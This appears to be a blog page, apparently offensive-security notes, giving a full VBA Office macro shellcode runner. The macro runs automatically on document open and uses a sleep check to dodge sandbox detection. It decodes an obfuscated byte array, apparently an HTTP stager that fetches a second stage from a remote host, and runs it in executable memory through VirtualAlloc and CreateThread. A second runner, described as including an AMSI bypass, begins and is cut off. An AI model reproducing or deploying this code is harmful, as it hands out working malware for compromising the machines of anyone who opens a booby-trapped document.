<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">CreateThread</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">SecurityAttributes</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">StackSize</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">StartFunction</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ThreadParameter</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">CreateFlags</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByRef</span> <span class="nx">ThreadId</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>

<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">VirtualAlloc</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">lpAddress</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">dwSize</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">flAllocationType</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">flProtect</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>

<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">RtlMoveMemory</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">lDestination</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByRef</span> <span class="nx">sSource</span> <span class="nx">As</span> <span class="nx">Any</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">lLength</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>

<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">Sleep</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">mili</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">Long</span>

<span class="nb">Function</span> <span class="nx">MyMacro</span><span class="p">()</span>
	<span class="nx">Dim</span> <span class="nx">buf</span> <span class="nx">As</span> <span class="nx">Variant</span>
	<span class="nx">Dim</span> <span class="nx">addr</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
	<span class="nx">Dim</span> <span class="nx">counter</span> <span class="nx">As</span> <span class="nx">Long</span>
	<span class="nx">Dim</span> <span class="nx">data</span> <span class="nx">As</span> <span class="nx">Long</span>
	<span class="nx">Dim</span> <span class="nx">res</span> <span class="nx">As</span> <span class="nx">Long</span>
	<span class="nx">Dim</span> <span class="nx">t1</span> <span class="nx">As</span> <span class="nb">Date</span>
	<span class="nx">Dim</span> <span class="nx">t2</span> <span class="nx">As</span> <span class="nb">Date</span>
	<span class="nx">Dim</span> <span class="nx">time</span> <span class="nx">As</span> <span class="nx">Long</span>
	
<span class="dl">'</span><span class="s1">sleeper to bypass heuristic detection
	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	
	If time &lt; 2 Then
		Exit Function
	End If

</span><span class="dl">'</span><span class="nx">shellcode</span> <span class="nx">generated</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">helper</span>
	<span class="nx">buf</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">254</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">145</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">212</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">201</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">18</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">201</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">127</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">106</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">34</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">169</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">85</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">89</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">105</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">55</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">237</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">48</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">152</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">160</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">70</span><span class="p">,</span> <span class="mi">242</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">152</span><span class="p">,</span> <span class="nx">_</span>
<span class="mi">139</span><span class="p">,</span> <span class="mi">228</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">242</span><span class="p">,</span> <span class="mi">183</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">215</span><span class="p">)</span>

<span class="dl">'</span><span class="s1">decryption routine
For i = 0 To UBound(buf)
	buf(i) = buf(i) - 2
Next i

	addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)
	
	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub

</span></code></pre></div></div>

<p>another of my custom VBA runner with AMSI bypass abd other goodies <strong>read comments</strong></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Type</span> <span class="nx">MODULEINFO</span>
  <span class="nx">lpBaseOfDLL</span> <span class="nx">As</span> <span class="nx">Long</span>
  <span class="nx">SizeOfImage</span> <span class="nx">As</span> <span class="nx">Long</span>
  <span class="nx">EntryPoint</span> <span class="nx">As</span> <span class="nx">Long</span>
<span class="nx">End</span> <span class="nx">Type</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">Sleep</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">mili</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">Long</span>
